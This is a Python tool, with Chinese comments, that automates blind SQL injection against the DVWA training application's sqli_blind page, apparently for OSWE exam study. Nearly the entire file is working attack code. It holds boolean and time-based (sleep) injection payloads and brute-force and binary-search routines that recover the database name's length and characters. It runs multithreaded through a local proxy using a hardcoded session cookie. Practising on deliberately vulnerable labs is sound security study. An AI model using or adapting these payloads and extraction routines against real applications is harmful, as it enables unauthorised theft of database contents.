import requests
import time
import random
from itertools import chain
from concurrent.futures import ThreadPoolExecutor
import copy
config = {
    "url": "http://www.oswe.com/",                  # url
    "path": "dvwa/vulnerabilities/sqli_blind/",     # 请求路径
    "http_method": "get",                           # 请求方式
    "headers": {                                    # 请求头
        "Cookie": "PHPSESSID=1gcg07m06qtas62l4haoun5f2k; security=low"
    },
    "params":{                                      # 请求参数
        "id": "1",
        "Submit": "Submit"
    },
    "vuln_param": "id",                             # 注入参数
    "payload": "1\' and if(substr(database(),i_foo,1)=\'s_foo\',sleep(3),1) #",     # 时间爆破长度
    "bool": None,                                   # bool 注入预期回显，若为 None 视为时间注入
    "time": 3,                                      # 时间注入预期回显时间，若为 None 视为布尔注入
    "proxies": {
        "http": "http://127.0.0.1:8080",  # HTTP代理
        "https": "https://127.0.0.1:8080"  # HTTPS代理（注意协议）
    }
}

# 发送请求，若为预期回显则返回 true，否则返回 false
def attack(config):
    earlier = ""
    latter = ""
    if(config["http_method"] == "get"):
        earlier = time.time()
        rep = requests.get(config["url"] + config["path"], params=config["params"],headers=config["headers"],proxies=config["proxies"])
        latter = time.time()
    else:
        earlier = time.time()
        rep = requests.post(config["url"] + config["path"], params=config["params"],headers=config["headers"],proxies=config["proxies"])
        latter = time.time()
    if(config["bool"] != None and config["bool"] in rep.text):
        return True
    elif(config["time"] != None and latter - earlier >= float(config["time"])):
        return True
    else:
        return False
    
# 爆破遍历
def worker(config, index=None):
    if "=" not in config["payload"]:
        print("[!] 未检测出等于号!")
        return 0
    if index:                                                       # 如果检测出来 index，说明要爆破一个字符串的第 index 个字符。
        my_range = chain(range(48, 58), range(97, 123), range(65, 91))   # 生成 0-9a-zA-Z 的字符码范围（ASCII值）
    else:
        my_range = range(1,100)
    for i in my_range:                               # 暴力枚举
        if index:
            payload = config["payload"].replace("i_foo",str(index)).replace("s_foo",str(chr(i)))  # 爆破的是字符串的第 index 个字符。
        else:
            payload = config["payload"].replace("i_foo",str(i))  # 爆破的是长度
        if config["vuln_param"] in config["params"]:                # 将 payload 放入到参数
            config["params"][config["vuln_param"]] = payload
        else:
            print("[!] 检测到参数中不存在 vuln_param !")
            return 0
        if attack(config):
            return i

# 二分爆破遍历
def finder(config,low,high,index=None):
    if ">" in config["payload"]:
        mode = ">"
    elif "<" in config["payload"]:
        mode = "<"
    else:
        print("[!] 未检测出大于号或小于号!")
        return 0
    # reply = self.send(expr, self.current_m)，将n和m的比较发过去
    if index:                                                       # 如果检测出来 index，说明要爆破一个字符串的第 index 个字符。
        # my_range = list(chain(range(48, 58), range(97, 123), range(65, 91)))   # 生成 0-9a-zA-Z 的字符码范围（ASCII值）
        m = random.randint(low,high)  # 从列表中随机选择一个值
        payload = config["payload"].replace("i_foo",str(index)).replace("s_foo",str(chr(m)))
    else:                                                           # 否则的话，说明爆破长度
        m = random.randint(low,high)                   # m 表示猜的数，n 表示真实数
        payload = config["payload"].replace("i_foo",str(m))
    if config["vuln_param"] in config["params"]:
        config["params"][config["vuln_param"]] = payload        # 替换 payload
    else:
        print("[!] 检测到参数中不存在 vuln_param !")
        return 0
    if mode == ">":  # n>m  => m<n
        if attack(config):                                 # reply == "嗯对":
            # m < n 成立，m 太小，移动下界
            low = m + 1
        else:
            # m >= n，移动上界
            high = m
    else:  # n<m => m>n
        if attack(config):
            # m > n 成立，m 太大，移动上界
            high = m - 1
        else:
            # m <= n，移动下界
            low = m

    # 二分查找直到 low >= high
    while low < high:
        # 根据模式选择中点策略，防止死循环
        if mode == ">":  # n>m
            m = (low + high) // 2      # 向下取整中点
        else:  # n<m
            m = (low + high + 1) // 2  # 向上取整中点
        # 再一次发送m和n的比较
        if index:                                                       # 如果检测出来 index，说明要爆破一个字符串的第 index 个字符。
            payload = config["payload"].replace("i_foo",str(index)).replace("s_foo",str(chr(m)))
        else:                                                           # 否则的话，说明爆破长度
            payload = config["payload"].replace("i_foo",str(m))
        config["params"][config["vuln_param"]] = payload
        if mode == ">":
            if attack(config):
                low = m + 1
            else:
                high = m
        else:
            if attack(config):
                high = m - 1
            else:
                low = m
    m = low
    return m

# 并发爆破/枚举函数：保序收集结果

def cracker(config, threads, length, mode, method='finder', low=None, high=None):
    # 如果是时间盲注，串行执行，避免请求重叠
    if config.get('time') is not None:
        results = []
        for idx in range(1, length+1):
            if mode == 'char':
                val = worker(copy.deepcopy(config), idx) if method == 'worker' else finder(copy.deepcopy(config), low, high, idx)
            else:
                val = worker(copy.deepcopy(config), None) if method == 'worker' else finder(copy.deepcopy(config), low, high, None)
            if val is None:
                raise RuntimeError(f"Index {idx} failed to crack (None result)")
            results.append(val)
        # 返回
        return ''.join(chr(v) for v in results) if mode=='char' else (results[0] if length==1 else results)

    # 常规并发模式
    # 1. 提交任务并保留索引
    tasks = []  # 存放 (idx, Future)
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for idx in range(1, length+1):
            cfg = copy.deepcopy(config)
            if mode == 'char':
                fut = executor.submit(worker, cfg, idx) if method=='worker' else executor.submit(finder, cfg, low, high, idx)
            else:
                fut = executor.submit(worker, cfg, None) if method=='worker' else executor.submit(finder, cfg, low, high, None)
            tasks.append((idx, fut))
    # 2. 收集并保序
    results = [None]*length
    for idx, fut in tasks:
        val = fut.result()
        if val is None:
            raise RuntimeError(f"Index {idx} failed to crack (None result)")
        results[idx-1] = val
    # 3. 返回
    if mode=='char':
        return ''.join(chr(v) for v in results)
    return results[0] if length==1 else results


if __name__ == "__main__":
    config["bool"] = "exists"           # 设置 bool 盲注预期回显
    config["time"] = None
    config["payload"] = "1\' and length(database())=i_foo #"
    print(worker(config))# 爆破长度
    config["payload"] = "1\' and substr(database(),i_foo,1)=\'s_foo\' #"
    print(cracker(config,10,4,"char","worker",95,124))# 爆破库名
    config["payload"] = "1\' and substr(database(),i_foo,1)>\'s_foo\' #"
    print(cracker(config,10,4,"char","finder",60,124))# 爆破库名
    config["time"] = "3"                # 设置时间盲注预期回显时间
    config["bool"] = None
    config["payload"] = "1\' and if(length(database())=i_foo,sleep(3),1) #"
    print(worker(config))       # 爆破长度
    config["payload"] = "1\' and if(substr(database(),i_foo,1)=\'s_foo\',sleep(3),1) #"
    print(cracker(config,10,4,"char","worker",95,124))# 爆破库名
    config["payload"] = "1\' and if(substr(database(),i_foo,1)>\'s_foo\',sleep(3),1) #"
    print(cracker(config,10,4,"char","finder",60,124))# 爆破库名